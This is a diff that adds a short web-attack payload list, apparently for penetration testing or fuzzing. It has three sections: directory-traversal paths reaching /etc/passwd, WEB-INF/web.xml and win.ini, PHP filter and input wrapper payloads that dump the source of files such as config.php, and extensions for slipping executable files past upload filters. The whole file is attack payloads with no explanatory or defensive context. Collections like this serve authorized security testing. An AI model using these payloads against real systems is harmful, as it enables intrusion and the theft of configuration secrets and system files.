@@ -1,0 +1,15 @@
+# [LFI-Basic]
+../../../../../../../../etc/passwd
+/var/www/html/WEB-INF/web.xml
+C:\Windows\win.ini
+
+# [PHP-Wrappers]
+php://filter/convert.base64-encode/resource=config.php
+php://filter/read=convert.quoted-printable-encode/resource=index.php
+php://input (POST body)
+
+# [Upload-Bypass]
+.php.jpg
+.phtml
+.jspx
+.ashx
